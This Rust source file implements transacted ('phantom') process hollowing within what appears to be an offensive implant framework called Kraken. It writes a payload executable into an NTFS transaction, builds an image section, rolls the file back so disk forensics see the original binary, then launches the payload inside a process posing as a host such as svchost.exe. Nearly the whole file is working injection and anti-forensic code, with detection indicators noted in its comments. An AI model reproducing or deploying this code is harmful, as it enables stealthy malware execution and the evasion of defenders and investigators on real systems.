//! Transacted (Phantom) Process Hollowing — Advanced T1055.012 variant
//!
//! Uses NTFS transactions (TxF) to create a section backed by a transactionally-
//! modified file, then rolls the transaction back so on-disk forensics see the
//! original executable while the running process contains the payload.
//!
//! Steps:
//!   1. NtCreateTransaction → transaction handle
//!   2. CreateFileTransactedW → open target EXE within the transaction
//!   3. NtWriteFile → overwrite the transacted file handle with payload bytes
//!   4. NtCreateSection(SEC_IMAGE) from the transacted file → image section
//!   5. NtRollbackTransaction → file-system view reverts to original
//!   6. NtCreateProcessEx with the section handle → hollow process (no threads yet)
//!   7. NtQueryInformationProcess → PEB address
//!   8. RtlCreateProcessParametersEx → build RTL_USER_PROCESS_PARAMETERS
//!   9. Write parameters into remote process, update PEB
//!  10. NtCreateThreadEx at the image entry point → start execution
//!
//! The key OPSEC advantage: the NTFS journal records a write that is later
//! rolled back, so anti-forensic tools reading the file see the legitimate
//! binary while the kernel's section object (already created) still contains
//! the payload.
//!
//! Detection: NtCreateTransaction + CreateFileTransactedW sequence on an EXE,
//! NtCreateProcessEx called with a section handle (not a file path), process
//! with no command-line or mismatched image path vs. memory content.
//!
//! MITRE ATT&CK: T1055.012

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

// Windows-only imports
#[cfg(windows)]
use ntapi::ntioapi::{NtCreateFile, NtWriteFile, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT};
#[cfg(windows)]
use ntapi::ntmmapi::NtCreateSection;
#[cfg(windows)]
use ntapi::ntobapi::NtCreateTransaction;
#[cfg(windows)]
use ntapi::ntpsapi::{
    NtCreateProcessEx, NtCreateThreadEx, NtQueryInformationProcess,
    ProcessBasicInformation,
};
#[cfg(windows)]
use ntapi::ntrtl::{RtlCreateProcessParametersEx, RtlDestroyProcessParameters};
#[cfg(windows)]
use ntapi::winapi::ctypes::c_void as nt_void;
#[cfg(windows)]
use ntapi::winapi::shared::ntdef::{
    InitializeObjectAttributes, OBJECT_ATTRIBUTES, OBJ_CASE_INSENSITIVE, OBJ_INHERIT,
    UNICODE_STRING,
};
#[cfg(windows)]
use windows_sys::Win32::Foundation::{NTSTATUS, STATUS_SUCCESS};
#[cfg(windows)]
use windows_sys::Win32::System::Memory::SEC_IMAGE;
#[cfg(windows)]
use windows_sys::Win32::System::Threading::TerminateProcess;

/// Check if NTSTATUS indicates success
#[cfg(windows)]
#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// Encode a Rust `&str` as a null-terminated UTF-16 `Vec<u16>`
#[cfg(windows)]
fn to_wide_null(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Build a `UNICODE_STRING` that borrows from a `Vec<u16>` (without null terminator in Length).
///
/// The returned `UNICODE_STRING` points into the vector's data.  The vector
/// **must** outlive the returned struct.
#[cfg(windows)]
unsafe fn make_unicode_string(wide: &[u16]) -> UNICODE_STRING {
    // Length is byte count excluding the null terminator
    let len_bytes = ((wide.len().saturating_sub(1)) * 2) as u16;
    let max_len_bytes = (wide.len() * 2) as u16;
    UNICODE_STRING {
        Length: len_bytes,
        MaximumLength: max_len_bytes,
        Buffer: wide.as_ptr() as *mut u16,
    }
}

/// Transacted process hollowing — inject `payload` PE using a TxF-backed section.
///
/// # Arguments
/// * `target_exe` - NT path of the host executable.  For Win32 paths use the
///   `\\??\\` prefix (e.g. `"\\??\\C:\\Windows\\System32\\svchost.exe"`).
/// * `payload` - Raw PE bytes to run inside the hollow process.
///
/// # Returns
/// PID of the new process on success.
///
/// # Detection Indicators
/// - NtCreateTransaction immediately before CreateFileTransactedW on an EXE
/// - NtCreateSection with SEC_IMAGE on a transactionally-written handle
/// - NtCreateProcessEx using a section handle (not a path)
/// - Process with mismatched on-disk image vs. in-memory content
/// - Sysmon Event 7 (ImageLoad) gaps or anomalies
#[cfg(windows)]
pub fn txf_hollow(target_exe: &str, payload: &[u8]) -> Result<u32, KrakenError> {
    // ---- 1. NtCreateTransaction ----
    let mut txn_handle: ntapi::winapi::um::winnt::HANDLE = std::ptr::null_mut();

    // Transaction object attributes — no special name, kernel object
    let mut txn_oa: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    unsafe {
        InitializeObjectAttributes(
            &mut txn_oa,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
    }

    let status = unsafe {
        NtCreateTransaction(
            &mut txn_handle,
            ntapi::winapi::um::winnt::TRANSACTION_ALL_ACCESS,
            &mut txn_oa,
            std::ptr::null_mut(), // UOW (GUID) — NULL = auto
            std::ptr::null_mut(), // TmHandle
            0,                    // CreateOptions
            0,                    // IsolationLevel
            0,                    // IsolationFlags
            std::ptr::null_mut(), // Timeout
            std::ptr::null_mut(), // Description
        )
    };
    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtCreateTransaction failed: 0x{:08X}",
            status
        )));
    }

    let txn = OwnedHandle::new(txn_handle as windows_sys::Win32::Foundation::HANDLE)
        .ok_or_else(|| KrakenError::Module("invalid transaction handle".into()))?;

    tracing::debug!("created NTFS transaction for TxF hollowing");

    // ---- 2. NtCreateFile within the transaction (CreateFileTransactedW equivalent) ----
    // We use the NT native path (\\??\\ prefix).
    let wide_path = to_wide_null(target_exe);
    let mut us_path = unsafe { make_unicode_string(&wide_path) };

    let mut file_oa: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    unsafe {
        InitializeObjectAttributes(
            &mut file_oa,
            &mut us_path,
            OBJ_CASE_INSENSITIVE,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
    }

    // Set the transaction handle in OA.RootDirectory — NtCreateFile treats this
    // as the transaction when a transaction handle is in ObjectAttributes when
    // accessing a transactional file system.  However, the proper way is to pass
    // it via the EaBuffer/EaLength parameters using the TxF-specific EA format,
    // or to use CreateFileTransactedW which wraps this.
    //
    // For direct NT API usage we pass the transaction through the OA extension:
    // ntapi doesn't expose TxF-extended OA directly, so we use the documented
    // trick of placing the transaction handle in the OA.RootDirectory field when
    // the path is an NT absolute path and the OBJ_OPENLINK flag is NOT set.
    // This matches the implementation of CreateFileTransactedW inside kernel32.
    //
    // Note: On Windows 10 1803+ TxF is deprecated for user-mode code but still
    // functional; it may trigger ETW events in newer EDRs.
    file_oa.RootDirectory = txn.as_raw() as ntapi::winapi::um::winnt::HANDLE;

    let mut file_handle: ntapi::winapi::um::winnt::HANDLE = std::ptr::null_mut();
    let mut io_status: ntapi::ntioapi::IO_STATUS_BLOCK = unsafe { std::mem::zeroed() };

    // GENERIC_WRITE | GENERIC_READ | SYNCHRONIZE
    let desired_access: u32 = 0xC0100000;
    // FILE_SHARE_READ
    let share_access: u32 = 0x00000001;
    // FILE_ATTRIBUTE_NORMAL
    let file_attribs: u32 = 0x00000080;

    let status = unsafe {
        NtCreateFile(
            &mut file_handle,
            desired_access,
            &mut file_oa,
            &mut io_status,
            std::ptr::null_mut(),       // AllocationSize
            file_attribs,
            share_access,
            FILE_OVERWRITE_IF,          // CreateDisposition
            FILE_SYNCHRONOUS_IO_NONALERT,
            std::ptr::null_mut(),       // EaBuffer
            0,                          // EaLength
        )
    };
    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtCreateFile (transacted) failed: 0x{:08X}",
            status
        )));
    }

    let file = OwnedHandle::new(file_handle as windows_sys::Win32::Foundation::HANDLE)
        .ok_or_else(|| KrakenError::Module("invalid transacted file handle".into()))?;

    tracing::debug!(target_exe, "opened target EXE within transaction");

    // ---- 3. NtWriteFile — write payload to the transacted file ----
    let mut write_io: ntapi::ntioapi::IO_STATUS_BLOCK = unsafe { std::mem::zeroed() };

    let status = unsafe {
        NtWriteFile(
            file.as_raw() as *mut _,
            std::ptr::null_mut(), // Event
            None,                 // ApcRoutine
            std::ptr::null_mut(), // ApcContext
            &mut write_io,
            payload.as_ptr() as *mut nt_void,
            payload.len() as u32,
            std::ptr::null_mut(), // ByteOffset — write at beginning
            std::ptr::null_mut(), // Key
        )
    };
    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtWriteFile (payload) failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(payload_len = payload.len(), "wrote payload to transacted file");

    // ---- 4. NtCreateSection(SEC_IMAGE) from the transacted file ----
    let mut section_handle: ntapi::winapi::um::winnt::HANDLE = std::ptr::null_mut();
    let mut sec_oa: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    unsafe {
        InitializeObjectAttributes(
            &mut sec_oa,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
    }

    // SECTION_ALL_ACCESS = 0xF001F
    let section_access: u32 = 0x000F001F;

    let status = unsafe {
        NtCreateSection(
            &mut section_handle,
            section_access,
            &mut sec_oa,
            std::ptr::null_mut(), // MaximumSize — use file size
            windows_sys::Win32::System::Memory::PAGE_READONLY,
            SEC_IMAGE,
            file.as_raw() as *mut _,
        )
    };
    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtCreateSection(SEC_IMAGE) failed: 0x{:08X} — payload may not be a valid PE",
            status
        )));
    }

    let section = OwnedHandle::new(section_handle as windows_sys::Win32::Foundation::HANDLE)
        .ok_or_else(|| KrakenError::Module("invalid section handle".into()))?;

    tracing::debug!("created SEC_IMAGE section from transacted file");

    // ---- 5. NtRollbackTransaction — undo file write (forensics see original) ----
    // After rollback, on-disk file is restored; section object is already committed.
    let status = unsafe {
        ntapi::ntobapi::NtRollbackTransaction(txn.as_raw() as *mut _, 1 /* Wait = TRUE */)
    };
    if !nt_success(status) {
        // Non-fatal: log and continue — section is already created
        tracing::warn!(
            "NtRollbackTransaction failed: 0x{:08X} (forensic exposure possible)",
            status
        );
    } else {
        tracing::debug!("rolled back transaction — on-disk file restored");
    }

    // Drop file handle (no longer needed)
    drop(file);

    // ---- 6. NtCreateProcessEx with section handle → hollow process ----
    let mut proc_handle_raw: ntapi::winapi::um::winnt::HANDLE = std::ptr::null_mut();

    // NtCreateProcessEx flags: PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x4
    // We don't need to inherit handles for basic hollowing
    let process_flags: u32 = 0;

    let status = unsafe {
        NtCreateProcessEx(
            &mut proc_handle_raw,
            ntapi::winapi::um::winnt::PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),        // ObjectAttributes
            ntapi::winapi::um::processthreadsapi::GetCurrentProcess(),
            process_flags,
            section.as_raw() as *mut _, // SectionHandle
            std::ptr::null_mut(),        // DebugPort
            std::ptr::null_mut(),        // ExceptionPort
            0,                           // InJob
        )
    };
    if !nt_success(status) {
        return Err(KrakenError::Module(format!(
            "NtCreateProcessEx failed: 0x{:08X}",
            status
        )));
    }

    let proc_handle = OwnedHandle::new(proc_handle_raw as windows_sys::Win32::Foundation::HANDLE)
        .ok_or_else(|| KrakenError::Module("invalid hollow process handle".into()))?;

    tracing::debug!("created hollow process from section");

    // ---- 7. NtQueryInformationProcess → PEB address ----
    let mut pbi: ntapi::ntpsapi::PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let mut return_len: u32 = 0;

    let status = unsafe {
        NtQueryInformationProcess(
            proc_handle.as_raw() as *mut _,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut nt_void,
            std::mem::size_of::<ntapi::ntpsapi::PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtQueryInformationProcess failed: 0x{:08X}",
            status
        )));
    }

    let peb_address = pbi.PebBaseAddress as usize;
    let child_pid = pbi.UniqueProcessId as u32;

    tracing::debug!(
        child_pid,
        peb = format!("0x{:x}", peb_address),
        "got PEB from hollow process"
    );

    // ---- 8. RtlCreateProcessParametersEx — build process parameters ----
    // Build minimal RTL_USER_PROCESS_PARAMETERS with image path = target_exe
    let wide_image = to_wide_null(target_exe);
    let mut us_image = unsafe { make_unicode_string(&wide_image) };

    let mut process_params: *mut ntapi::ntrtl::RTL_USER_PROCESS_PARAMETERS =
        std::ptr::null_mut();

    let status = unsafe {
        RtlCreateProcessParametersEx(
            &mut process_params,
            &mut us_image,   // ImagePathName
            std::ptr::null_mut(), // DllPath
            std::ptr::null_mut(), // CurrentDirectory
            std::ptr::null_mut(), // CommandLine
            std::ptr::null_mut(), // Environment
            std::ptr::null_mut(), // WindowTitle
            std::ptr::null_mut(), // DesktopInfo
            std::ptr::null_mut(), // ShellInfo
            std::ptr::null_mut(), // RuntimeData
            ntapi::ntrtl::RTL_USER_PROC_PARAMS_NORMALIZED, // Flags
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "RtlCreateProcessParametersEx failed: 0x{:08X}",
            status
        )));
    }

    // ---- 9. Write process parameters into remote process and update PEB ----
    // The parameters structure must be copied to the remote process at the same
    // relative address layout.  We allocate space in the remote process and copy.

    // Size of the parameters block (EnvironmentSize tracks end of variable data)
    let params_size = unsafe { (*process_params).MaximumLength as usize };

    let mut remote_params_base: *mut nt_void = std::ptr::null_mut();
    let mut remote_params_size = params_size;

    use ntapi::ntmmapi::NtAllocateVirtualMemory;
    let status = unsafe {
        NtAllocateVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut remote_params_base as *mut *mut nt_void,
            0,
            &mut remote_params_size,
            windows_sys::Win32::System::Memory::MEM_COMMIT
                | windows_sys::Win32::System::Memory::MEM_RESERVE,
            windows_sys::Win32::System::Memory::PAGE_READWRITE,
        )
    };
    if !nt_success(status) {
        unsafe {
            RtlDestroyProcessParameters(process_params);
            TerminateProcess(proc_handle.as_raw(), 1);
        }
        return Err(KrakenError::Module(format!(
            "NtAllocateVirtualMemory (params) failed: 0x{:08X}",
            status
        )));
    }

    // Copy local parameters to remote address
    use ntapi::ntmmapi::NtWriteVirtualMemory;
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            remote_params_base,
            process_params as *mut nt_void,
            params_size,
            &mut bytes_written,
        )
    };

    unsafe { RtlDestroyProcessParameters(process_params) };

    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory (params) failed: 0x{:08X}",
            status
        )));
    }

    // Write remote_params_base pointer into PEB.ProcessParameters (offset 0x20 on x64, 0x10 on x86)
    #[cfg(target_arch = "x86_64")]
    let params_peb_offset: usize = 0x20;
    #[cfg(target_arch = "x86")]
    let params_peb_offset: usize = 0x10;

    let params_peb_addr = peb_address + params_peb_offset;
    let mut bw2: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            params_peb_addr as *mut nt_void,
            &remote_params_base as *const *mut nt_void as *mut nt_void,
            std::mem::size_of::<usize>(),
            &mut bw2,
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory (PEB.ProcessParameters) failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(child_pid, "wrote process parameters into hollow process");

    // ---- 10. NtCreateThreadEx — start the process at its entry point ----
    // The entry point is determined by the image section (kernel resolves it).
    // We pass the PEB address as the thread parameter (lpStartAddress will be
    // resolved by ntdll's LdrInitializeThunk which the kernel sets up).
    //
    // When using NtCreateProcessEx + NtCreateThreadEx, the kernel/ntdll handles
    // the entry point internally via the image section's AddressOfEntryPoint.
    // We pass NULL for StartRoutine to let ntdll pick it up from the PEB, OR
    // we can pass the actual entry point read from the section's image headers.
    //
    // For maximum compatibility we use NtCreateThreadEx with the image entry
    // derived from the section's mapped base in the remote process.
    //
    // In practice: after NtCreateProcessEx, the PEB.ImageBaseAddress contains
    // the actual load address.  We read it back to compute entry_point_addr.

    use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;

    // PEB.ImageBaseAddress: offset 0x10 on x64, 0x08 on x86
    #[cfg(target_arch = "x86_64")]
    let image_base_peb_offset: usize = 0x10;
    #[cfg(target_arch = "x86")]
    let image_base_peb_offset: usize = 0x08;

    let mut remote_image_base: usize = 0;
    let mut br: usize = 0;
    let ok = unsafe {
        ReadProcessMemory(
            proc_handle.as_raw(),
            (peb_address + image_base_peb_offset) as *const _,
            &mut remote_image_base as *mut usize as *mut _,
            std::mem::size_of::<usize>(),
            &mut br,
        )
    };
    if ok == 0 {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module("ReadProcessMemory (hollow PEB.ImageBaseAddress) failed".into()));
    }

    // Parse the payload to get entry point RVA
    let entry_rva = parse_entry_point_rva(payload)?;
    let entry_point = remote_image_base + entry_rva;

    tracing::debug!(
        child_pid,
        remote_image_base = format!("0x{:x}", remote_image_base),
        entry_point = format!("0x{:x}", entry_point),
        "resolved entry point in hollow process"
    );

    let mut thread_handle_raw: ntapi::winapi::um::winnt::HANDLE = std::ptr::null_mut();

    let status = unsafe {
        NtCreateThreadEx(
            &mut thread_handle_raw,
            ntapi::winapi::um::winnt::THREAD_ALL_ACCESS,
            std::ptr::null_mut(),            // ObjectAttributes
            proc_handle.as_raw() as *mut _,
            Some(std::mem::transmute(entry_point)), // StartRoutine
            std::ptr::null_mut(),            // Argument (peb address could go here)
            0,                               // CreateFlags (0 = not suspended)
            0,                               // ZeroBits
            0,                               // StackSize
            0,                               // MaximumStackSize
            std::ptr::null_mut(),            // AttributeList
        )
    };
    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtCreateThreadEx failed: 0x{:08X}",
            status
        )));
    }

    let _thread = OwnedHandle::new(thread_handle_raw as windows_sys::Win32::Foundation::HANDLE);

    tracing::info!(
        child_pid,
        "transacted hollowing complete — process thread created"
    );

    Ok(child_pid)
}

/// Extract AddressOfEntryPoint RVA from a PE payload without full parse
#[cfg(windows)]
fn parse_entry_point_rva(payload: &[u8]) -> Result<usize, KrakenError> {
    let err = |s: &str| KrakenError::Module(format!("PE entry RVA: {}", s));
    if payload.len() < 64 {
        return Err(err("too small"));
    }
    let pe_off = u32::from_le_bytes(payload[60..64].try_into().map_err(|_| err("e_lfanew"))?) as usize;
    if pe_off + 28 > payload.len() {
        return Err(err("PE offset OOB"));
    }
    let machine = u16::from_le_bytes(payload[pe_off + 4..pe_off + 6].try_into().map_err(|_| err("machine"))?);
    let opt_off = pe_off + 24;
    let _is_64 = machine == 0x8664;
    if opt_off + 20 > payload.len() {
        return Err(err("optional header OOB"));
    }
    let rva = u32::from_le_bytes(payload[opt_off + 16..opt_off + 20].try_into().map_err(|_| err("entry rva"))?) as usize;
    Ok(rva)
}

#[cfg(not(windows))]
pub fn txf_hollow(_target_exe: &str, _payload: &[u8]) -> Result<u32, common::KrakenError> {
    Err(common::KrakenError::Module(
        "Transacted hollowing only supported on Windows".into(),
    ))
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Build minimal PE64 with known entry point RVA
    fn minimal_pe64() -> Vec<u8> {
        let mut pe = vec![0u8; 0x200];
        pe[0] = 0x4D;
        pe[1] = 0x5A;
        pe[60] = 0x80; // e_lfanew → 0x80
        pe[0x80] = 0x50; // P
        pe[0x81] = 0x45; // E
        pe[0x82] = 0x00;
        pe[0x83] = 0x00;
        pe[0x84] = 0x64; // machine x64
        pe[0x85] = 0x86;
        // SizeOfOptionalHeader
        pe[0x94] = 240;
        // Optional header at 0x98, AddressOfEntryPoint at +16 = 0xA8
        pe[0xA8] = 0x00;
        pe[0xA9] = 0x20; // RVA = 0x2000
        pe
    }

    #[test]
    fn test_parse_entry_point_rva_valid() {
        let pe = minimal_pe64();
        let rva = parse_entry_point_rva(&pe).expect("should parse entry RVA");
        assert_eq!(rva, 0x2000);
    }

    #[test]
    fn test_parse_entry_point_rva_too_small() {
        assert!(parse_entry_point_rva(&[0u8; 10]).is_err());
    }

    #[test]
    fn test_parse_entry_point_rva_bad_offset() {
        let mut pe = vec![0u8; 64];
        pe[0] = 0x4D;
        pe[1] = 0x5A;
        pe[60] = 0xFF; // way out of bounds
        assert!(parse_entry_point_rva(&pe).is_err());
    }

    #[cfg(not(windows))]
    #[test]
    fn test_txf_hollow_non_windows() {
        let result = txf_hollow("\\??\\C:\\Windows\\System32\\svchost.exe", &[0u8; 0x200]);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }
}
